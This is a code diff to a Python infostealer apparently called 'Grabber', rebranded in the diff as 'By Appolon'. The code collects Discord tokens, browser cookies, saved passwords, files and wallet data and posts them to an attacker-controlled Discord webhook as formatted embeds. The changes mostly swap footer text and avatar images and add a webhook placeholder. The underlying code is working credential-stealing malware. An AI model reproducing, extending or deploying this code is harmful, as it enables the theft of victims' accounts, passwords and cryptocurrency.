@@ -18,7 +18,9 @@ import random
 import re
 import subprocess
 
+
 hook = "WillBeReplaceBiUrWebHook"
+#hookx = "you can set one but why ?"
 
 DETECTED = False
 
@@ -270,7 +272,7 @@ def uploadToken(token, path):
     username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)
 
     if pfp == None: 
-        pfp = "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg"
+        pfp = "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -329,16 +331,16 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "L kids",
-                "icon_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg"
+                "text": "By Appolon",
+                "icon_url": "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg",
-        "username": "Grabber",
+        "avatar_url": "",
+
         "attachments": []
         }
 
@@ -371,13 +373,13 @@ def upload(name, link):
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [Cookies.txt]({link})",
                     "color": 12517376,
                     "footer": {
-                        "text": "L kids",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg"
+                        "text": "By Appolon",
+                        "icon_url": "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9"
                     }
                 }
             ],
-            "username": "Grabber",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg",
+    
+            "avatar_url": "",
             "attachments": []
             }
     
@@ -398,13 +400,13 @@ def upload(name, link):
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{PasswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [Password.txt]({link})",
                     "color": 12517376,
                     "footer": {
-                        "text": "L kids",
-                        "icon_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg"
+                        "text": "By Appolon",
+                        "icon_url": "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9"
                     }
                 }
             ],
-            "username": "Grabber",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg",
+    
+            "avatar_url": "",
             "attachments": []
             }
     
@@ -427,13 +429,13 @@ def upload(name, link):
                     "name": "File Stealer"
                 },
                 "footer": {
-                    "text": "L kids",
-                    "icon_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg"
+                    "text": "By Appolon",
+                    "icon_url": "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9"
                 }
                 }
             ],
-            "username": "Grabber",
-            "avatar_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg",
+    
+            "avatar_url": "",
             "attachments": []
             }
     
@@ -615,13 +617,13 @@ def GatherZips(paths1, paths2, paths3):
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 12517376,
             "footer": {
-                "text": "L kids",
-                "icon_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg"
+                "text": "By Appolon",
+                "icon_url": "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9"
             }
             }
         ],
-        "username": "Grabber",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1063194194279145512/1066095838440456334/istockphoto-517109442-170667a.jpg",
+
+        "avatar_url": "https://visage.surgeplay.com/face/128/9eb5eaeb-a684-4286-84ba-22432bb0f2a9",
         "attachments": []
     }
 
